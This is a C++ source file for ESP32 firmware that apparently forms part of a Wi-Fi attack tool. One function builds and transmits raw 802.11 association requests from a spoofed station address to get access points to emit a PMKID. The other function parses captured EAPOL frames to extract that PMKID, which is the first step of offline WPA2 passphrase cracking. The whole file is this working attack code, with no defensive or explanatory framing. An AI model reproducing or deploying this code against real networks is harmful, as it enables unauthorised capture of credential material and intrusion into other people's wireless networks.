#include "utils/network/PmkidUtil.h"

#include <esp_wifi.h>
#include <cstring>

namespace PmkidUtil {

void sendAssocRequest(const uint8_t* bssid, const uint8_t* staMac,
                      const char* ssid, uint8_t ssidLen) {
  if (ssidLen == 0 || ssidLen > 32) return;
  uint8_t f[128]; size_t n = 0;
  f[n++] = 0x00; f[n++] = 0x00;                 // FC: mgmt, assoc request
  f[n++] = 0x00; f[n++] = 0x00;                 // duration
  memcpy(f + n, bssid,  6); n += 6;             // addr1 = AP
  memcpy(f + n, staMac, 6); n += 6;             // addr2 = our spoofed STA
  memcpy(f + n, bssid,  6); n += 6;             // addr3 = BSSID
  f[n++] = 0x00; f[n++] = 0x00;                 // seq-ctl
  f[n++] = 0x31; f[n++] = 0x00;                 // capability: ESS + Privacy + ShortPreamble
  f[n++] = 0x0A; f[n++] = 0x00;                 // listen interval
  f[n++] = 0x00; f[n++] = ssidLen; memcpy(f + n, ssid, ssidLen); n += ssidLen;  // SSID IE
  static const uint8_t rates[] = {0x01,0x08,0x82,0x84,0x8B,0x96,0x0C,0x12,0x18,0x24};
  memcpy(f + n, rates, sizeof(rates)); n += sizeof(rates);
  // RSN IE: PSK / CCMP — prompts the AP to start the 4-way and emit M1 (with PMKID)
  static const uint8_t rsn[] = {
    0x30, 0x14, 0x01, 0x00,
    0x00, 0x0F, 0xAC, 0x04,             // group cipher: CCMP
    0x01, 0x00, 0x00, 0x0F, 0xAC, 0x04, // pairwise: CCMP
    0x01, 0x00, 0x00, 0x0F, 0xAC, 0x02, // AKM: PSK
    0x00, 0x00 };                        // RSN capabilities
  memcpy(f + n, rsn, sizeof(rsn)); n += sizeof(rsn);
  esp_wifi_80211_tx(WIFI_IF_AP, f, n, false);
}

bool hasPmkid(const uint8_t* data, uint16_t len) {
  static const uint8_t snap[8] = {0xAA, 0xAA, 0x03, 0x00, 0x00, 0x00, 0x88, 0x8E};
  int so = -1;
  for (uint16_t i = 24; i + 16 <= len; i++) {
    bool m = true; for (int k = 0; k < 8; k++) if (data[i + k] != snap[k]) { m = false; break; }
    if (m) { so = i; break; }
  }
  if (so < 0) return false;
  const uint8_t* e = data + so + 8;
  if (len < (uint16_t)(so + 8 + 99)) return false;
  uint16_t kdLen = ((uint16_t)e[97] << 8) | e[98];
  const uint8_t* kd = e + 99;
  if ((so + 8 + 99 + kdLen) > len) kdLen = len - (so + 8 + 99);
  for (uint16_t i = 0; i + 6 + 16 <= kdLen; i++) {
    if (kd[i] == 0xDD && kd[i+2] == 0x00 && kd[i+3] == 0x0F && kd[i+4] == 0xAC && kd[i+5] == 0x04) {
      bool z = true; for (int q = 0; q < 16; q++) if (kd[i+6+q]) { z = false; break; }
      return !z;
    }
  }
  return false;
}

}  // namespace PmkidUtil
